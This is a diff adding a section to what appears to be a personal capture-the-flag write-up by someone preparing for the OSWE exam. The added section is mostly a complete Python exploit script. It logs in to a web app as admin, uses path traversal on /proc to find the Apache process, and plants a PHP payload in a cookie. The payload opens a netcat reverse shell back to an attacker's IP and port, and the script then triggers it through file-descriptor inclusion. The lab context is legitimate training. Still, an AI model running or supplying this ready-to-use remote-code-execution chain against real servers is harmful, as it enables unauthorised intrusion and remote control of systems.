@@ -155,3 +155,52 @@ root@ubuntu:/tmp#
 Honestly I am okay with these boxes having an easier privesc. The first part of them are usually close to what I am expecting of the OSWE, but there isn't a local privilege escalation step like this in the exam, so that's okay by me.
 
 One of my favorite boxes so far. Again, I'm super happy with the script I built :)
+
+___
+
+I'm back once again. I see I was super proud of that script, and today after looking at it I can confidently say it sucks :D If this happens, it means I'm improving, so no biggie.
+I'll probably look back at this new full version and still think it's bad. Anyway, here it is
+
+````
+import sys, requests, re
+
+def main():
+	# Log in as admin
+	session = requests.Session()
+	session.cookies["user_pref"] = 'y'
+	url = server + "/authenticate.php"
+	data = {"username":"admin", "password":"8C6976E5B5410415BDE908BD4DEE15DFB167A9C873FC4BB8A81F6F2AB448A918"}
+
+	r = session.post(url, data=data)
+
+	# Search for current PID
+	url = server + "/home.php"
+	data = {"search":"../../../../../../proc/self/stat"}
+
+	r = session.post(url, data=data)
+
+	# Save self PID
+	pid = re.findall(r"(\d+)(?=\s\(apache2\))", r.text)[0]
+
+	# Iterate over FDs to find where our cookie is injected
+	for i in range(1,22):
+		session.cookies["user_pref"] = '<%3fphp+system("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/bash+-i+2>%261|nc+{}+{}+>/tmp/f")+%3f>'.format(attacker, port)
+		data = {"search" : "../../../../../../../../proc/{}/fd/{}".format(pid,i)}
+		r = session.post(url, data=data)
+		if "user_pref" in r.text:
+			r = session.post(url, data=data)
+			print(r.text)
+			print("PID: {}, FD: {}".format(pid, i))
+			sys.exit()
+
+if __name__ == '__main__':
+	try:
+		server = sys.argv[1].strip()
+		attacker = sys.argv[2].strip()
+		port = sys.argv[3].strip()
+	except:
+		print("[-] Usage: %s serverIP:port attackerIP port!" % sys.argv[0], sys.argv[3])
+		sys.exit()
+	print("Don't forget to open the listener on port {}!".format(port))
+	main()
+````
